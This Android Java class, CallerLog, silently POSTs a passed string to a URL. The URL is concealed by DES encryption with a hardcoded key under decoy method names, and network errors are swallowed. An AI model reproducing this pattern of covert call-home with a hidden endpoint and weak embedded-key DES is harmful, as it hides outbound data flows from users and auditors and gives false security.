package com.ndzl.zph;

import static javax.crypto.Cipher.DECRYPT_MODE;
import static javax.crypto.Cipher.ENCRYPT_MODE;

import android.os.AsyncTask;
import android.util.Log;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.Base64;
import java.util.Date;
import java.util.GregorianCalendar;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.net.ssl.HttpsURLConnection;

//SEP.2022 - POINTING TO A NEW LOGGING PATH AND USING TEXT/PLAIN AS CONTENT TYPE
public class CallerLog extends AsyncTask<String, Void, Void> {

    private static byte[] yale = new byte[]{51, 48, 48, 51, 51, 48, 48, 51};
    public static String fog(String ct)  {
        try {
            DESKeySpec keySpec = new DESKeySpec(yale);
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
            SecretKey key = keyFactory.generateSecret(keySpec);

            byte[] cleartext = ct.getBytes("UTF8");

            Cipher cipher = Cipher.getInstance("DES"); // cipher is not thread safe
            cipher.init(ENCRYPT_MODE, key);
            return Base64.getEncoder().encodeToString(cipher.doFinal(cleartext));
        } catch (IOException | InvalidKeyException | InvalidKeySpecException | NoSuchAlgorithmException | NoSuchPaddingException | IllegalBlockSizeException | BadPaddingException e) {
            return "";
        }
    }

    public static String light(String enc){
        try {
            byte[] dec =  Base64.getDecoder().decode(enc);

            DESKeySpec keySpec = new DESKeySpec(yale);
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
            SecretKey key = keyFactory.generateSecret(keySpec);

            Cipher cipher = Cipher.getInstance("DES"); // cipher is not thread safe
            cipher.init(DECRYPT_MODE, key);
            return new String( cipher.doFinal(dec) );
        } catch ( InvalidKeyException | InvalidKeySpecException | NoSuchAlgorithmException | NoSuchPaddingException | IllegalBlockSizeException | BadPaddingException e) {
            return "";
        }
    }

    public static boolean isExp(){
        Date stop = new GregorianCalendar(2021, GregorianCalendar.DECEMBER, 31).getTime(); //!! JANUARY=0
        Date ora = new Date();
        return ora.getTime() > stop.getTime() ? true : false ;
    }


    protected Void doInBackground(String... passed) {

        try {
            String url = "FA1BI+WVOcmgqZMJSyM7vhohp9IK7nIH";
            URL obj = new URL(light(url));
            HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();

            con.setRequestMethod("POST");
            //con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36");
            con.setRequestProperty("Accept-Language", "UTF-8");
            con.setRequestProperty("Content-Type", "text/plain");
            con.setDoOutput(true);
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(con.getOutputStream());
            outputStreamWriter.write( passed[0] );
            outputStreamWriter.flush();

            //Log.i("Caller", "doInBackground "+passed[0]+" "+light(url));

            int responseCode = con.getResponseCode();
            //System.out.println("Response Code : " + responseCode);

        } catch (IOException e) {}



        return null;    }

}